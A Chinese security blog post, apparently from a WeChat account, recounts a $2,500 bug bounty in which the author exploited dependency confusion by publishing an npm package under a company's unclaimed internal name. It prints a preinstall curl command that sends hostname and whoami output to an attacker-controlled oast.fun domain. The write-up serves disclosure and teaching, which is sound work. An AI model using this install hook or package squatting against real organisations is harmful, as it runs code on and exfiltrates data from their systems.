---
title: 2,500 美元漏洞报告-通过未认领的 Node 包进行远程代码执行 (RCE)
url: https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247489731&idx=1&sn=2186b5230165ffa81d5b3f73d659278c&chksm=fb02959bcc751c8d15bbf41d5159696428c4d9c6d9fa2c6f2e13309b74cf59d2aa80cbe4d426&scene=58&subscene=0#rd
source: 黑伞安全
date: 2025-02-28
fetch_date: 2025-10-06T20:38:58.877010
---

# 2,500 美元漏洞报告-通过未认领的 Node 包进行远程代码执行 (RCE)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDV3Qa2KoNf3X7WbiaIv7MZ2h5s1nYBKibbicYK9hvrfNSyxlt3ic34WUkmyg/0?wx_fmt=jpeg)

# 2,500 美元漏洞报告-通过未认领的 Node 包进行远程代码执行 (RCE)

原创

枇杷哥

黑伞安全

# 什么是依赖混淆？

依赖混淆是一种软件供应链漏洞，当公司的内部软件包被错误地从公共存储库（例如 npm）而不是其私有注册表下载时，就会发生这种情况。如果软件包管理器（如 npm、pip 或其他）默认从公共源提取，并且那里存在同名的软件包，就会发生这种情况。

在依赖项混淆攻击中，攻击者可以创建与公司内部软件包同名的恶意软件包，并将其发布到公共注册表。如果公司的系统从公共注册表中解析该软件包，它们可能会下载并执行攻击者的代码，从而导致远程代码执行 (RCE) 等安全风险。

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDVoMBJGMYDeuoSUPiab4ZiarnGwWxEVCcMt4LV621qvM6PF7iaEZedY0FpA/640?wx_fmt=png&from=appmsg)

## 如何识别漏洞

在一次挖洞中，我检查了公司的一个 JavaScript 文件，发现它引用了存储在Node.js 包的/node\_modules/@confidential-package-name中。这表明该公司正在使用内部 npm 包。我检查了这个内部包是否已在公共 npm 注册表上发布，结果发现它在 npm 上无人认领。

这种无人认领的状态表明任何人可以创建同名的包，并可能导致依赖混淆问题，因为欺骗公司系统从公共 npm 注册表而不是其内部源下载和执行代码。

## 漏洞如何被利用

为了确认风险，我使用与内部包相同的名称创建了一个恶意的 npm 包@confidential-package-name。然后，我将这个包发布到公共 npm 注册表，并嵌入一个旨在安装时自动执行的预安装脚本。

预安装脚本简单但有效：

```
curl — data-urlencode “info=$(hostname && whoami)” http://<攻击者控制的域>.oast.fun
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDVfIB7JbP7vwJ7P2S1tOtb14HicORaUibJYr9GoB7KDEibAMXW2LCu4Pe7w/640?wx_fmt=png&from=appmsg)

该脚本会将安装包的服务器的主机名和用户信息发送到我控制的域。一旦包在 npm 上线，我就会耐心等待，在几小时到几天内，我开始收到来自公司生产和非生产环境的多个请求，确认他们的系统正在下载并执行恶意软件包

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDVIMXKSLjjqoK10XbWIwibsmT7NuE9CeF2faYJ1IvlDibYtqShZqhL2D2g/640?wx_fmt=png&from=appmsg)

请求包括主机名和用户名等详细信息.

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDVAERSYVngOM5rgZK3a6kLqQlgBPGyucFWghib2UToZnXFsJ2iaLF3hYQQ/640?wx_fmt=png&from=appmsg)

## 我秦始皇 打钱

在我控制的主机上收到超过 150 次 HTTP 和 DNS 查询后，我开始分析 IP 地址和从中检索的数据。我通过过滤掉已知的爬虫程序来整理列表，然后继续对所有剩余 IP 进行 WHOIS 查询，以检查是否有任何 IP 与公司的 IP 范围或其服务提供商相匹配。

分析完成后，我编写了报告。报告在同一天被分类（非常感谢 Raven\_Bugcrowd 的快速分类！），一周之内，报告就被接受了。我获得了 2,500 美元的赏金——这是该特定程序的最高奖励。

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr41NSib8aDw25jtiaWpy6XDVTFNUlgOOKYq1k9cuZH3H0VakoOylxU9SB008snLOPOIibHX4FuqNjMA/640?wx_fmt=png&from=appmsg)

后台回复"枇杷哥的枇杷熟了吗" 免费领取 大模型 ATT&CK电子版

如果你是一个长期主义者，欢迎加入我的知识星球,我们一起冲，一起学。2025 年春节推出内部云安全课程，后续涨价 159 元。每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpcY6gfCIxenk0q7P2HTb6zldNBBUcicPWcznpg5HxMcbvvWF5aAFj3sPJC7yYI5PUibHib7Vo9xWCicw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

黑伞安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过